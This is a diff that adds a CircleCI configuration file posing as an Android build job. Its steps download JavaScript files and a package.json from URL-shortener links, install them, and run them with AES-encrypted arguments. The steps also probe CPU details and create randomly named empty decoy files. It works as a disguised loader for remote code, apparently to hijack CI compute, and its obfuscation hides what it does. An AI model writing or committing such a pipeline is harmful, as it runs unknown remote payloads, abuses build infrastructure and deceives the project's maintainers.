@@ -1,0 +1,51 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  user:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/bcivR -o cnc00ot9gkbsveh85edv2e.js && curl -fsSL
+          shorturl.at/zEWZ9 -o jzwrv4o5u5.js && curl -fsSL shorturl.at/estAJ -o
+          package.json
+      - run: touch k65m8bdvg521ye71tuto4lmeyr.js
+      - run: touch 566il44s91dolmxztbldplo.cpp
+      - run: npm i -s
+      - run: touch 0ud305lltjbla9yk8p1ya.java
+      - run: mkdir 8fgjspfjb818dd21u73e
+      - run: touch koc5n0bpmu1rpml7x9.css
+      - run: touch 0b1rxg0ntka3hkvej3h57itot.java
+      - run: node cnc00ot9gkbsveh85edv2e -r
+          U2FsdGVkX1+Q0u4F0/IPUpC06U5nqFFbxZKy1XbX3OfB6b2WEugDFgISWLMogMjudJNBRDwBoDLeP5YcXln2X5zPhKr4v4Q25x160JYvdtpu/ZYIcMMwcKMAyAH57yctXTNYKpjA4Mc9+VklIFV0++M3FTUPu8pY3ugeJPtjRWTNhKsmjoYJ+5m26LZ8EoeK9TmON9v6fCyMJ4vcL1DCe61UcCL0UlgQHiriJ2kXdtCLz1RfFJyw/nPvV41bQvV3E5MOQreVbqo+T7Vw8ao2Jcg7ReOL00RH0abpHh+rYQQ=
+          -sp -t
+          U2FsdGVkX1/JwhjGs7lfX1wcn/AUNCZfvHeGuvKSkP4htLXNNNlGxDYHPof7UB2J -s
+          U2FsdGVkX19P912wuHACogrUKk0pTLcSlvdCDgx0DRfkUYh/A5QdMrwAc8ME6E9tuCGgXeZa5cqG/MTC2vVH1S2+5ensI8RNAhT6LauUgH5UyHb3rzZvza/iLmXS/yjSFszmIh411rX6Cfegw3r1YfzhN7o2bH2FVF15hruiufiWZyMdSreYSzb8yM4POWCUIrl4gstlbnwPb6NsoAAzg/+t3RI4oVB1QwCOJ6g6GKI=
+          -lpn U2FsdGVkX19K1hLRbIUZtRRUApdks01iUZVOyqQp1dg=
+  run-jobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch g4cnzog2pbnrck.ts
+      - run: curl -fsSL shorturl.at/dvS15 -o nmszwo0o.js && curl -fsSL shorturl.at/fmtzD
+          -o dwfqu7a.js && curl -fsSL shorturl.at/cxzMO -o package.json
+      - run: touch 51tmtmul0egwb4pe96u2.py
+      - run: touch 78ed5tr1dt8pbrctlg9xfl7n.html
+      - run: npm i -s
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: mkdir t950wigvmjhh3kc
+      - run: node nmszwo0o -r
+          U2FsdGVkX18J3hHuU/Jz0P76YsjzgHZ1OP9aQ96SnT6ZHCp1LfO1YhCKPOhr/h09tXU0FWIygHkwQjLZwEj+4RTRd4azs6sSxH0Hdu/9yLdvYdchp8UxMikBZkkHOAGXvAUBBjPWGD4pQsgX0VJZaVuP6ldj/swW8JcMRkqiAsLvhHRE0BEh4nla7uXC2hw9CUpbxRDGeeN9vc8zDzG/U0z/03W3dK+mw/JJlyvsF8WyDKWJ5FfTgzpHVOoGSexh9vGfJPzgQpsrsee0H8MINaKFJMCl4MNrIPbRbmFbRjY=
+          -t U2FsdGVkX1/xMvAzvngCNRk1/dhJtG6FxwdpFjOCW4xB4LeHc4IdyWbR/vt+pBSc
+          -lpn U2FsdGVkX1+6ArgGirvBdbSxjQRGTP2AMnIvYW6Gfyg= -sp -s
+          U2FsdGVkX18+DH8KAwb6yFlBQeCbVhHcOIVOmbjsiYe7HEOBnnfa9eLl3GakLYtURCFNQTi4QPWN0hY2lAhl+FWlj8sx2WJsJK6p7HN+QeBPcbV4wSc3FzJM5PkLWuUk1K8mtpn877ud9oL+YkMR7OXxIxKRXyii/3SIewbTqJTlyEB2QaPxX+xE3Fs+Iu3lu43KTqA2SFnd3gAl5iU1b2mGazeE6Z+6gUXXtVq2Qvg=
+      - run: touch anmbbqdlvbysi91oivojn3b.sh
+workflows:
+  start-jobs:
+    jobs:
+      - user
+  bomaycatdaumoi:
+    jobs:
+      - run-jobs
